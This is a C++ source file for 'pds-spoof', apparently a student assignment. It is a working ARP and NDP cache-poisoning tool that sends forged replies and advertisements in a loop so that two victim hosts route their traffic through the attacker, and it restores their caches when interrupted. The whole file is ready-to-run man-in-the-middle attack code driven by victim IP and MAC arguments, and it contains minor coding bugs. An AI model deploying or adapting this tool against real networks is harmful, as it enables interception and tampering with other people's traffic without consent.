#include "pds-spoof.h"

/**
 *	Spoofer Application Entry Point
 */
int main(int argc, char** argv)
{

	processArguments(argc, argv);

	extractAddressesForInterface();

	signal(SIGINT, &preventViolentTermination);		// Note to myself: Maybe a bit unnecessary this early


	// Start cache poisoning by selected protocol
	if (P.protocol == ETH_P_ARP)
	{
		poisonARPCache();
	}
	else	
	{
		// Not ARP means NDP
		poisonNDPCache();
	}

	return EXIT_SUCCESS;
}



/**
 * When called initiates ARP cache poisonning (and waits for termination signal)
 */
void poisonARPCache()
{

	std::cout << "ARP Cache poisoning initiated... hit CTRL+C to terminate." << std::endl;

	// Prepare ARP response packet for Victim-1 & Victim-2
	uint8_t outMac1[MAC_ADDR_LEN];
	uint8_t outMac2[MAC_ADDR_LEN];
	convertDottedMAC(P.victimMAC1, outMac1);
	convertDottedMAC(P.victimMAC2, outMac2);
	uint32_t victim1IP4 = inet_addr(P.victimIP1.c_str());
	uint32_t victim2IP4 = inet_addr(P.victimIP2.c_str());

	// Send on two different socket address
	struct sockaddr_ll socketAddress1;
	prepareARPSocketAddress(&socketAddress1, outMac1);
	struct sockaddr_ll socketAddress2;
	prepareARPSocketAddress(&socketAddress2, outMac2);

	ARPPacket victim1Packet = prepareARPResponsePacket(addresses.macAddressLocal, victim2IP4, outMac1, victim1IP4);
	ARPPacket victim2Packet = prepareARPResponsePacket(addresses.macAddressLocal, victim1IP4, outMac2, victim2IP4);

	// But use only one socket though
	int socketARP = socket(AF_PACKET, SOCK_DGRAM, htons(ETH_P_ARP));
	useconds_t	sleepTime = 1000 * P.poisonTimeout;

	while (true)
	{
		signal(SIGINT, &preventViolentTermination);	

		if (sendto(socketARP, &victim1Packet, sizeof(victim1Packet), 0, (sockaddr*) &socketAddress1, sizeof(socketAddress1)) < 0)
		{
			std::cerr << "Unable to send ARP packet to victim 1" << std::endl;
		}


		if (sendto(socketARP, &victim2Packet, sizeof(victim2Packet), 0, (sockaddr*) &socketAddress2, sizeof(socketAddress2)) < 0)
		{
			std::cerr << "Unable to send ARP packet to victim 2" << std::endl;
		}

		// Sleep for 5 seconds before retrying
		usleep(sleepTime);

	}
}


/**
 * Cures poisoned ARP cache (called on violent termination)
 */
void antidoteARPCache()
{
	// Prepare ARP response packet for Victim-1 & Victim-2
	uint8_t outMac1[MAC_ADDR_LEN];
	uint8_t outMac2[MAC_ADDR_LEN];
	convertDottedMAC(P.victimMAC1, outMac1);
	convertDottedMAC(P.victimMAC2, outMac2);
	uint32_t victim1IP4 = inet_addr(P.victimIP1.c_str());
	uint32_t victim2IP4 = inet_addr(P.victimIP2.c_str());

	struct sockaddr_ll socketAddress1;
	prepareARPSocketAddress(&socketAddress1, outMac1);

	struct sockaddr_ll socketAddress2;
	prepareARPSocketAddress(&socketAddress2, outMac2);

	ARPPacket cureVictim1 = prepareARPResponsePacket(outMac2, victim2IP4, outMac1, victim1IP4);
	ARPPacket cureVictim2 = prepareARPResponsePacket(outMac1, victim1IP4, outMac2, victim2IP4);

	// Set correct packets
	int socketARP = socket(AF_PACKET, SOCK_DGRAM, htons(ETH_P_ARP));


	useconds_t sleepTime = (1000 * P.poisonTimeout);
	std::cerr << "Waiting " << P.poisonTimeout << " useconds before sending the cure..." << std::endl;
	usleep(sleepTime);

	for (int i = 0; i < ARP_CURE_REPLIES_COUNT; i++)
	{
		if (sendto(socketARP, &cureVictim1, sizeof(cureVictim1), 0, (sockaddr*) &socketAddress1, sizeof(socketAddress1)) < 0)
		{
			std::cerr << "Unable to send antidote ARP packet to victim 1. will try again." << std::endl;
			i++;
		}

		if (sendto(socketARP, &cureVictim2, sizeof(cureVictim2), 0, (sockaddr*) &socketAddress2, sizeof(socketAddress2)) < 0)
		{
			std::cerr << "Unable to send antidote ARP packet to victim 1. will try again." << std::endl;
			i++;
		}
	}

	close(socketARP);
}



/**
 *	Prepares (poisoned) ARP reply packet
 */
ARPPacket prepareARPResponsePacket(uint8_t* senderMac, uint32_t senderIP, uint8_t* targetMac, uint32_t targetIP)
{
	// Default reply packet values
	ARPPacket packet;
	packet.hw_type			=	htons ( ARP_ETHERNET_HWTYPE );
	packet.proto_type 		=	htons ( ARP_IPV4_PROTOTYPE );
	packet.hw_addr_len		=	MAC_ADDR_LEN;
	packet.proto_addr_len	=	IPV4_LEN;
	packet.operation		=	htons ( ARP_OPERATION_REPLY );

	// Set victim specific information
	memcpy(&packet.sender_hw_addr, senderMac, MAC_ADDR_LEN);
	memcpy(&packet.sender_proto_addr, &senderIP, IPV4_LEN);
	memcpy(&packet.target_hw_addr, targetMac, MAC_ADDR_LEN);
	memcpy(&packet.target_proto_addr, &targetIP, IPV4_LEN);

	return packet;
}


/**
 * Prepare sockaddr_ll address
 * Store it to socketAddress parameter
 */
void prepareARPSocketAddress(struct sockaddr_ll* socketAddress, uint8_t* address)
{
	socketAddress->sll_family 	= AF_PACKET;
	socketAddress->sll_family   = AF_PACKET;										
	socketAddress->sll_protocol = htons ( ETH_P_ARP ); 							
	socketAddress->sll_ifindex  = if_nametoindex(P.interfaceName.c_str());
	socketAddress->sll_hatype   = 1; 											
	socketAddress->sll_pkttype  = PACKET_OTHERHOST;
	socketAddress->sll_halen	   = MAC_ADDR_LEN;
	memcpy(&socketAddress->sll_addr, address, MAC_ADDR_LEN);
}


/**
 *	Prepare overriding NA packet
 */
NeighborAdvertisementPacket prepareNDPAdvertisementPacket(uint8_t* macAddr, in6_addr ip)
{
	NeighborAdvertisementPacket packet;

	// Set ICMPv6 specific fields
	packet.head.nd_na_hdr.icmp6_type = 136;	// Advertisement mesage TODO: Introduce constant for this
	packet.head.nd_na_hdr.icmp6_code = 0;	// Unused
	packet.head.nd_na_hdr.icmp6_cksum = htons ( 0 ) ;

	// Set receiving end IP
	packet.head.nd_na_target = ip;

	// The greatest pain - switch the unsolicit flag bit
	// Let's start with clearing flags
	// (and actually... setting the override bit flag so the cache wont persist)
	uint8_t flags[4] = { 0x20, 0x00, 0x00, 0x00 };

	memcpy(&packet.head.nd_na_hdr.icmp6_dataun, flags, 4);	// TODO: Also introduce some constant
	

	packet.type = 2;		// Empirical wireshark approach determined that this is the proper value.

	// Set those parts to some random, but inteligent values 
	packet.length = 1;
	memcpy(&packet.MAC, macAddr, MAC_ADDR_LEN);

	return packet;
}


/**
 *	When called initiate NDP cache poisonning (and waits for termination signal)
 */
void poisonNDPCache()
{
	std::cout << "ARP Cache poisoning initiated... hit CTRL+C to terminate." << std::endl;

	// Prepare addressing information for victims
	uint8_t outMac1[MAC_ADDR_LEN];
	uint8_t outMac2[MAC_ADDR_LEN];
	in6_addr victim1IP6;
	in6_addr victim2IP6;
	
	// Le grand old converting & reformatting
	convertDottedMAC(P.victimMAC1, outMac1);
	convertDottedMAC(P.victimMAC2, outMac2);
	convertStringToIPv6(P.victimIP1, &victim1IP6);
	convertStringToIPv6(P.victimIP2, &victim2IP6);

	// We will be delivering packet(s) to ff02::1 (wanna-be broadcast)
	in6_addr targetAddress;
	convertStringToIPv6(IPV6_ALLNODES, &targetAddress);

	// Socket address
	sockaddr_in6 socketAddress = prepareNDPSocketAddress(targetAddress, P.interfaceName);

	// Send my MAC address to Victim-1 with IPv6 of Victim-2 and the other way around (pretty much ARP with slightly harder way to deliver payload)
	NeighborAdvertisementPacket packetVictim1 = prepareNDPAdvertisementPacket(addresses.macAddressLocal, victim2IP6);
	NeighborAdvertisementPacket packetVictim2 = prepareNDPAdvertisementPacket(addresses.macAddressLocal, victim1IP6);
	
	// Prepare socket
	int socketNDP = socket(AF_INET6, SOCK_RAW, IPPROTO_ICMPV6);

	// RFC says that those missing lines were the reason why I did not reach the stations. Let's hope RFC is right.
	int sockOptMaxHosts = 255;
	setsockopt(socketNDP, IPPROTO_IPV6, IPV6_MULTICAST_HOPS, &sockOptMaxHosts, sizeof(sockOptMaxHosts));

	useconds_t timeSleep = (1000 * P.poisonTimeout);

	// Send packets out 
	while (true)
	{

		// Lets hook onto violent termination signal
		signal(SIGINT, &preventViolentTermination);

		if (sendto(socketNDP, &packetVictim1, sizeof(packetVictim1), 0, (sockaddr*) &socketAddress, sizeof(socketAddress)) < 0)
		{
			std::cerr << "Unable to send advertisement packet to Victim one. Next try will be initiated after timeout you specified." << std::endl;
		}

		if (sendto(socketNDP, &packetVictim2, sizeof(packetVictim2), 0, (sockaddr*) &socketAddress, sizeof(socketAddress)) < 0)
		{
			std::cerr << "Unable to send advertisement packet to Victim two. Next try will be initiated after timeout you specified.";
		}


		usleep(timeSleep);
	}

}


/**
 * Antidote function for NDP cache - restores NDP cache to its former state.
 */
void antidoteNDPCache()
{
	// Prepare addressing information for victims
	uint8_t outMac1[MAC_ADDR_LEN];
	uint8_t outMac2[MAC_ADDR_LEN];
	in6_addr victim1IP6;
	in6_addr victim2IP6;
	
	// Le grand old converting & reformatting
	convertDottedMAC(P.victimMAC1, outMac1);
	convertDottedMAC(P.victimMAC2, outMac2);
	convertStringToIPv6(P.victimIP1, &victim1IP6);
	convertStringToIPv6(P.victimIP2, &victim2IP6);

	// We will be delivering packet(s) to ff02::1 (wanna-be broadcast)
	in6_addr targetAddress;
	convertStringToIPv6(IPV6_ALLNODES, &targetAddress);

	// Socket address
	sockaddr_in6 socketAddress = prepareNDPSocketAddress(targetAddress, P.interfaceName);

	// Send back original mac to ipv6 mapping
	NeighborAdvertisementPacket packetVictim1 = prepareNDPAdvertisementPacket(outMac1, victim1IP6);
	NeighborAdvertisementPacket packetVictim2 = prepareNDPAdvertisementPacket(outMac2, victim2IP6);

	// Prepare socket
	int socketNDPCure = socket(AF_INET6, SOCK_RAW, IPPROTO_ICMPV6);
		if (socketNDPCure < 0)
		{
			std::cerr << "Unable to create antidote socket." << std::endl;
			exit(-1);
		}

	// RFC says that those missing lines were the reason why I did not reach the stations. Let's hope RFC is right.
	int sockOptMaxHosts = 255;
	setsockopt(socketNDPCure, IPPROTO_IPV6, IPV6_MULTICAST_HOPS, &sockOptMaxHosts, sizeof(sockOptMaxHosts));
	setsockopt(socketNDPCure, SOL_SOCKET, SO_BINDTODEVICE, &P.interfaceName, sizeof(P.interfaceName));

	useconds_t timeSleep = (1000 * P.poisonTimeout);
	
	std::cerr << "Waiting " << P.poisonTimeout << " useconds before sending the cure..." << std::endl;
	usleep(timeSleep);

	for (int i = 0; i < ARP_CURE_REPLIES_COUNT; i++)
	{
		if (sendto(socketNDPCure, &packetVictim1, sizeof(packetVictim1), 0, (sockaddr*) &socketAddress, sizeof(socketAddress)) < 0)
		{
			std::cerr << "Unable to send antidote ARP packet to Victim 1. Will try again." << std::endl;
			i++;
		}

		if (sendto(socketNDPCure, &packetVictim2, sizeof(packetVictim2), 0, (sockaddr*) &socketAddress, sizeof(socketAddress)) < 0)
		{
			std::cerr << "Unable to send antidote ARP packet to Victim 2. Will try again." << std::endl;
			i++;
		}
	}

	close(socketNDPCure);
}


/**
 *	Prepares socket IPV6 address for NDP socket (returns the structure)
 */
sockaddr_in6 prepareNDPSocketAddress(in6_addr address, std::string interfaceName)
{
	sockaddr_in6 socket;
	socket.sin6_family = AF_INET6;
	socket.sin6_port = 0; // ?
	socket.sin6_flowinfo = 0; // ?
	socket.sin6_addr = address;
	socket.sin6_scope_id = if_nametoindex(interfaceName.c_str());
	
	return socket;
}


/**
 * Handles parameter processing
 * Since there is a requirement for -victim1ip and similar, instead of logical
 * --victim1ip and alike, I had to rip off several tutorials and authors, which
 * I will mention here:
 * http://stackoverflow.com/questions/17877368, specificall thanks to David M. Syzdek & phoxis
 * http://www.informit.com/articles/article.aspx?p=175771&seqNum=3
 * http://www.ibm.com/developerworks/aix/library/au-unix-getopt.html
 * http://stackoverflow.com/questions/313970 (C++ like string conversion)
 */
void processArguments(int argc, char** argv)
{
	if (argc != ARGUMENT_NUMBER)
	{
		std::cerr << "Incorrect arguments supplied. Try ./pds-spoof -i eth1 -t 10000 -p ARP -victim1ip ipaddr1 -victim2ip ipaddr2 -victim1mac macaddr1 -victim2mac macaddr2" << std::endl;
		exit(2);
	}

	int ch;
	int optind = 0;
	char* strtolErr;
	bool validationFailed = false;
	while ((ch = getopt_long_only(argc, argv, "i:t:p:victim1ip:victim2ip:victim1mac:victim2mac:", longopts, &optind)) != -1)
	{
		switch (ch)
		{
			case LONG_OPT_CASE:
				switch (optind)
				{
					// victim1-IP
					case 3:
						P.victimIP1 = optarg;
					break;
					// victim2-IP
					case 4:
						P.victimIP2 = optarg;
					break;
					// victim1-MAC
					case 5:
						P.victimMAC1 = optarg;
					break;
					// victim2-MAC
					case 6:
						P.victimMAC2 = optarg;
					break;
				}
			break;
			case 'i':
				P.interfaceName = optarg;
			break;
			case 't':
				P.poisonTimeout = strtol(optarg, &strtolErr, DECADIC_BASE);
					if (strtolErr == optarg)
					{
						std::cerr << "Provided invalid value for parameter -t. Try a number. Of miliseconds. A decadic one." << std::endl;
						validationFailed = true;
					}
			break;
			case 'p':
				std::string proto = std::string(optarg);
				std::transform(proto.begin(), proto.end(), proto.begin(), ::tolower);
				if (proto == "arp")
				{
					P.protocol = ETH_P_ARP;
				}
				else if (proto == "ndp")
				{
					P.protocol = IPPROTO_ICMPV6;
				}
				else
				{
					P.protocol = -1;
					validationFailed = true;
				}
			break;
		}
	}

	if (DEBUG)
		debug_showProcessedArguments();
}


/**
 * Debug function printing out Parameters structure
 */
void debug_showProcessedArguments()
{
	std::cout << "===DEBUG-PARAMS-START===" << std::endl;
	std::cout << "Printing out Parameters structure" << std::endl;
	std::cout << "Interface name: " << P.interfaceName << std::endl;
	std::cout << "Poison timeout: " << P.poisonTimeout << std::endl;
	std::cout << "Protocol: " << debug_getProtocolName(P.protocol) << std::endl;
	std::cout << "Victim-1 IP: " << P.victimIP1 << std::endl;
	std::cout << "Victim-2 IP: " << P.victimIP2 << std::endl;
	std::cout << "Victim-1 MAC: " << P.victimMAC1 << std::endl;
	std::cout << "Victim-2 MAC: " << P.victimMAC2 << std::endl;
	std::cout << "===DEBUG-PARAMS-END===" << std::endl;
}


/**
 * Debug function printing out protocol name
 */
std::string debug_getProtocolName(int proto)
{
	if (proto == ETH_P_ARP)
	{
		return std::string("ARP");
	}
	else if (proto == IPPROTO_ICMPV6)
	{
		return std::string("NDP");
	}
	else
	{
		return std::string("Undefined");
	}
}


/**
 *	Extracts MAC and IPv4||IPv6 (if applicable) from specified interface 
 *	This function works with Parameters structure
 */
void extractAddressesForInterface()
{
	struct ifaddrs* addressesStruct = NULL;
	struct ifaddrs* address = NULL;
	uint8_t localMAC[MAC_ADDR_LEN];
	void* tmpAddrPtr = NULL;

	if (getifaddrs(&addressesStruct) != 0)
	{
		std::cerr << "Error occured when trying to read addresses linked to provided interface!" << std::endl;
		exit(1);
	}

	for (address = addressesStruct; address != NULL; address = address->ifa_next)
	{

		if (!address->ifa_addr)
			continue;

		// We are not interested in addresses belonging to other interfaces
		if (P.interfaceName.compare(address->ifa_name))
			continue;

		// IPv4 interface address
		if (address->ifa_addr->sa_family == AF_INET)
		{
			char strBuffer[INET_ADDRSTRLEN];

			addresses.ipv4Raw 	  = (struct sockaddr_in *) address->ifa_addr;

			tmpAddrPtr = &((struct sockaddr_in *) address->ifa_addr)->sin_addr;
			inet_ntop(AF_INET, tmpAddrPtr, strBuffer, INET_ADDRSTRLEN);

			addresses.ipv4AddressLocal = strBuffer;

			if (DEBUG)
				printf("Saved interface IPv4 address %s\n", addresses.ipv4AddressLocal.c_str());
		}
		else if (address->ifa_addr->sa_family == AF_INET6)
		{
			char strBuffer[INET6_ADDRSTRLEN];

			tmpAddrPtr = &((struct sockaddr_in6 *) address->ifa_addr)->sin6_addr;
			inet_ntop(AF_INET6, tmpAddrPtr, strBuffer, INET6_ADDRSTRLEN);

			addresses.ipv6AddressLocal = strBuffer;
			
			memcpy(&addresses.ipv6Raw, (struct in6_addr*) address->ifa_addr, IPV6_LEN);

			if (DEBUG)
				printf("Saved interface IPv6 address %s\n", addresses.ipv6AddressLocal.c_str());
		}
		// Also, retrieve MAC address for given interface
		else if (address->ifa_data != 0)
		{

			// Prepare socket for mac-address retrieval
			int32_t sd = socket(PF_INET, SOCK_DGRAM, 0);
			if (sd < 0)
			{
				freeifaddrs(addressesStruct);
				return;
			}

			struct ifreq req;
			strcpy(req.ifr_name, address->ifa_name);
			if (ioctl(sd, 0x8927, &req) != 1)
			{
				uint8_t* mac = (uint8_t*) req.ifr_ifru.ifru_hwaddr.sa_data;
				memcpy(&addresses.macAddressLocal, mac, MAC_ADDR_LEN);
			}
		}
	}

	freeifaddrs(addressesStruct);
}


/**
 * Handles violent script termination (for now only CTRL+C type of signal)
 * On SIGINT end restores cache to its former state and then exits (successfuly)
 */
void preventViolentTermination(int source)
{
	if (source == SIGINT)
	{
		std::cerr << std::endl << "Termination request recorded. Cache is going to be restored to its former state." << std::endl;
		
		if (P.protocol == ETH_P_ARP)
		{
			antidoteARPCache();
		}
		else
		{
			antidoteNDPCache();
		}

		std::cerr << "Caches were given an antidote. Program will now terminate.";
		exit(EXIT_SUCCESS);
	}
}


/**
 *	Takes string representation of IPv6 address and stores its in6_addr 
 *	representation to allNodes parameter.
 *  Usage: 
 *   	in6_addr address;
 *		convertStringToIPv6(ipv6_inString, &address);
 *	Variable address will now contain parsed IPv6
 */
void convertStringToIPv6(std::string ipv6, in6_addr* allNodes)
{
	inet_pton(AF_INET6, ipv6.c_str(), allNodes);
}



/**
 *	Converts MAC address from XXXX.XXXX.XXXX notation to something more usefull\
 */
void convertDottedMAC(std::string mac, uint8_t* outmac)
{
	if (strlen(mac.c_str()) != 14)
	{
		std::cerr << "Provided MAC address does not correspond with assignment specification requirements." << std::endl;
		std::cerr << "You can try using something 14 characters long exactly, like this: 0800.222d.0101" << std::endl;
	}

	char buff[14];
	memcpy(&buff, mac.c_str(), 14);

	char buffS[17];
	buffS[0] = buff[0];
	buffS[1] = buff[1];
	buffS[2] = ':';

	buffS[3] = buff[2];
	buffS[4] = buff[3];
	buffS[5] = ':';
	
	buffS[6] = buff[5];
	buffS[7] = buff[6];
	buffS[8] = ':';

	buffS[9] = buff[7];
	buffS[10] = buff[8];
	buffS[11] = ':';


	buffS[12] = buff[10];
	buffS[13] = buff[11];
	buffS[14] = ':';
	buffS[15] = buff[12];
	buffS[16] = buff[13];

	std::string macString = std::string(buffS);

	// Thanks to TypelA, D Krueger (http://stackoverflow.com/questions/20553805)
	uint8_t bytes[6];
	int values[6];
	int i;

	if (6 == sscanf(macString.c_str(), "%x:%x:%x:%x:%x:%x", &values[0], &values[1], &values[2], &values[3], &values[4], &values[5]))
	{
		// Convert to uint8_T
		for (i = 0; i < 6; i++)
		{
			bytes[i] = (uint8_t) values[i];
		}
	}
	else
	{
		std::cerr << "MAC Address invalid. Clearly." << std::endl; 
	}

	memcpy(outmac, &bytes, MAC_ADDR_LEN);

	if (DEBUG)
	{
		std::cout << "Victim IP converted: " ;
		printReadableMACAddress(bytes);
		std::cout << std::endl;
	}


	// Note to myself: Got to admit, this was one of the harder stuff I programmed today.
}


/**
 *  Helper fuinction converting common MAC address representation to something readable
 */
void printReadableMACAddress(uint8_t* MAC)
{
	printf("%02X:%02X:%02X:%02X:%02X:%02X", MAC[0], MAC[1], MAC[2], MAC[3], MAC[4], MAC[5]);
}
